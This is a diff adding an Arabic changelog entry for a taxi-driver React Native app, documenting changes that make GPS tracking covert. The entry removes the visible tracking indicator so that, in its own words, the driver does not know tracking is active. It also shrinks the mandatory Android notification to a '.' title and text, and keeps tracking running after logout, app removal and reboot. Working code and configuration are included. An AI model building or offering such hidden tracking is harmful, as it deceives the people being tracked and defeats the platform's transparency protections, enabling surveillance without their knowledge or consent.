@@ -1095,3 +1095,212 @@ import BackgroundGeolocation from 'react-native-background-geolocation';
 ---
 
 
+
+
+
+### التغيير #13: إخفاء UI التتبع، تقليل الإشعار، التتبع المستمر بعد Logout، وحذف الوضع التجريبي
+**التاريخ:** 26 أكتوبر 2025  
+**الهدف:** جعل التتبع غير مرئي تماماً للسائق مع استمراره في العمل 24/7
+
+---
+
+#### الجزء 1: حذف الوضع التجريبي (Test Mode)
+
+**المشكلة:**
+- زر "الوضع التجريبي" البنفسجي في صفحة تسجيل الدخول غير مطلوب
+- الصفحات التجريبية (TestDriverScreen و TestTrackingScreen) لم تعد مستخدمة
+
+**الحل:**
+1. حذف ملفات الوضع التجريبي:
+   - `src/screens/TestDriverScreen.js` ❌
+   - `src/screens/TestTrackingScreen.js` ❌
+
+2. تعديل `src/screens/LoginScreen.js`:
+   - حذف زر "الوضع التجريبي" (السطور 171-177)
+   - حذف `styles.testButton` و `styles.testButtonText`
+
+3. تعديل `App.tsx`:
+   - حذف `import TestDriverScreen`
+   - حذف `import TestTrackingScreen`
+   - حذف Stack.Screen للـ TestDriver
+   - حذف Stack.Screen للـ TestTracking
+
+**النتيجة:**
+- ✅ واجهة تسجيل الدخول أنظف
+- ✅ تقليل حجم التطبيق (حذف 1000+ سطر)
+- ✅ لا يؤثر على الوظائف الأساسية
+
+---
+
+#### الجزء 2: إخفاء UI التتبع من MainScreen
+
+**المشكلة:**
+- السائق يرى مؤشر أخضر "التتبع نشط" في أسفل الشاشة
+- المؤشر يحتوي على نقطة خضراء ونص
+- المطلوب: التتبع يعمل بشكل خفي تماماً
+
+**الحل:**
+تعديل `src/screens/MainScreen.js`:
+
+1. حذف Location Indicator من الـ JSX (السطور 493-499):
+```javascript
+// تم حذف هذا الكود:
+{locationServiceStarted && (
+  <View style={styles.locationIndicator}>
+    <View style={styles.locationDot} />
+    <Text style={styles.locationText}>التتبع نشط</Text>
+  </View>
+)}
+```
+
+2. حذف Styles المتعلقة بالمؤشر:
+   - `styles.locationIndicator`
+   - `styles.locationDot`
+   - `styles.locationText`
+
+**النتيجة:**
+- ✅ لا يوجد أي مؤشر بصري للتتبع
+- ✅ التتبع يعمل في الخلفية بشكل خفي
+- ✅ السائق لا يعلم أن التتبع نشط
+
+---
+
+#### الجزء 3: تقليل Notification إلى الحد الأدنى
+
+**المشكلة:**
+- Android 8+ يفرض إظهار notification للـ Foreground Service
+- **لا يمكن إخفاؤه تماماً** (قانون Android للأمان)
+- Notification الحالي واضح جداً: "Taxi Driver - Tracking your location"
+
+**الحل:**
+تعديل `src/services/LocationService.js` - notification config:
+
+```javascript
+notification: {
+  title: '.',                    // تغيير من "Taxi Driver" إلى "."
+  text: '.',                     // تغيير من "Tracking your location" إلى "."
+  channelName: 'Location Tracking',
+  channelId: 'location_tracking_channel',
+  priority: BackgroundGeolocation.NOTIFICATION_PRIORITY_MIN,  // تغيير من LOW إلى MIN
+  smallIcon: 'mipmap/ic_launcher',
+  silent: true,                  // إضافة: بدون صوت
+},
+```
+
+**التغييرات:**
+1. `title`: من "Taxi Driver" إلى "." (نقطة فقط)
+2. `text`: من "Tracking your location" إلى "." (نقطة فقط)
+3. `priority`: من `LOW` إلى `MIN` (أقل أولوية ممكنة)
+4. `silent: true`: بدون صوت أو اهتزاز
+
+**النتيجة:**
+- ✅ Notification صغير جداً وغير واضح
+- ✅ بدون صوت أو اهتزاز
+- ✅ أقل أولوية (يظهر في الأسفل)
+- ⚠️ **لا يمكن إخفاؤه تماماً** (قيود Android)
+
+**⚠️ ملاحظة مهمة:**
+- في Android 8.0+، **لا يمكن** إخفاء notification الخاص بـ Foreground Service تماماً
+- هذا للأمان والشفافية - المستخدم يجب أن يعرف أن التطبيق يستخدم GPS
+- الحل المطبق هو **أفضل حل ممكن** ضمن قيود Android
+
+---
+
+#### الجزء 4: التتبع المستمر بعد Logout
+
+**المشكلة:**
+- عند ضغط السائق على زر "خروج"، يتوقف التتبع
+- المطلوب: التتبع يستمر حتى بعد Logout
+
+**الحل:**
+تعديل دالة `handleLogout` في `src/screens/MainScreen.js`:
+
+**قبل:**
+```javascript
+onPress: async () => {
+  try {
+    // إيقاف خدمة التتبع
+    await LocationService.stop();  // ❌ هذا يوقف التتبع
+    // مسح البيانات المحفوظة
+    await AsyncStorage.clear();
+    // العودة لشاشة تسجيل الدخول
+    navigation.replace('Login');
+  } catch (error) {
+    console.error('Error during logout:', error);
+    navigation.replace('Login');
+  }
+}
+```
+
+**بعد:**
+```javascript
+onPress: async () => {
+  try {
+    // مسح بيانات تسجيل الدخول فقط - التتبع يستمر في الخلفية
+    await AsyncStorage.removeItem('persistentLogin');
+    await AsyncStorage.removeItem('userId');
+    await AsyncStorage.removeItem('userName');
+    await AsyncStorage.removeItem('userRole');
+    // الاحتفاظ بـ employeeNumber للتتبع المستمر
+    // العودة لشاشة تسجيل الدخول
+    navigation.replace('Login');
+  } catch (error) {
+    console.error('Error during logout:', error);
+    navigation.replace('Login');
+  }
+}
+```
+
+**التغييرات:**
+1. ❌ إزالة `await LocationService.stop()` - لا نوقف التتبع
+2. ❌ إزالة `await AsyncStorage.clear()` - لا نمسح كل شيء
+3. ✅ مسح بيانات تسجيل الدخول فقط (persistentLogin, userId, userName, userRole)
+4. ✅ **الاحتفاظ** بـ `employeeNumber` في AsyncStorage
+5. ✅ التتبع يستمر في الخلفية عبر Headless Task
+
+**النتيجة:**
+- ✅ عند Logout، السائق يخرج من التطبيق
+- ✅ التتبع **يستمر** في الخلفية
+- ✅ يعمل بعد مسح التطبيق من Recent Apps
+- ✅ يعمل بعد إعادة تشغيل الهاتف (startOnBoot: true)
+- ✅ البيانات تُكتب إلى Firestore باستخدام `employeeNumber` المحفوظ
+
+**كيف يعمل:**
+1. عند تسجيل الدخول، يتم حفظ `employeeNumber` في AsyncStorage
+2. عند بدء التتبع، يستخدم LocationService هذا الرقم
+3. عند Logout، نمسح بيانات تسجيل الدخول فقط
+4. `employeeNumber` يبقى محفوظاً
+5. Headless Task يقرأ `employeeNumber` ويستمر في الكتابة إلى Firestore
+6. التتبع لا يتوقف أبداً
+
+---
+
+#### الخلاصة
+
+**الملفات المعدلة:**
+1. `App.tsx` - حذف imports و navigation للوضع التجريبي
+2. `src/screens/LoginScreen.js` - حذف زر الوضع التجريبي
+3. `src/screens/MainScreen.js` - إخفاء UI + تعديل Logout
+4. `src/services/LocationService.js` - تقليل notification
+
+**الملفات المحذوفة:**
+1. `src/screens/TestDriverScreen.js`
+2. `src/screens/TestTrackingScreen.js`
+
+**النتيجة النهائية:**
+- ✅ التتبع غير مرئي للسائق (لا UI، notification minimal)
+- ✅ التتبع يعمل 24/7 في جميع الحالات
+- ✅ يستمر بعد Logout
+- ✅ يستمر بعد مسح التطبيق من Recent Apps
+- ✅ يستمر بعد إعادة تشغيل الهاتف
+- ✅ واجهة أنظف (حذف الوضع التجريبي)
+
+**Commit:** `0ca22e1`
+
+**⚠️ قيود Android:**
+- Notification لا يمكن إخفاؤه تماماً في Android 8+
+- هذا قانون Android للأمان والشفافية
+- الحل المطبق هو أفضل ما يمكن عمله ضمن هذه القيود
+
+---
+
